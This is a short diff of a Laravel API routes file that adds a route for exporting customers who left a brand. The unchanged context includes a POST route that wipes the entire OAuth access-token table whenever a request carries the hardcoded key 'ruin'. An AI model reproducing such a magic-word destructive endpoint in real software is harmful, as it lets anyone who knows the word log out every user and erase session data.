@@ -265,6 +265,7 @@ Route::group(['middleware' => [\App\Http\Middleware\Localization::class, 'auth:a
     // Клиенты котрые получают бренды
     Route::get('/export-brands-customers', 'Api\CodesController@getCustomersWhoGetTheBrand');
     Route::get('/export-customers-who-left', 'Api\CodesController@exportCustomersWhoLeft');
+    Route::get('/export-customers-who-left-brand', 'Api\CodesController@exportCustomersWhoLeftBrand');
     Route::post('/close-users-access', function (Request $request) {
         if ($request->key === 'ruin') {
             \Illuminate\Support\Facades\DB::table('oauth_access_tokens')->truncate();
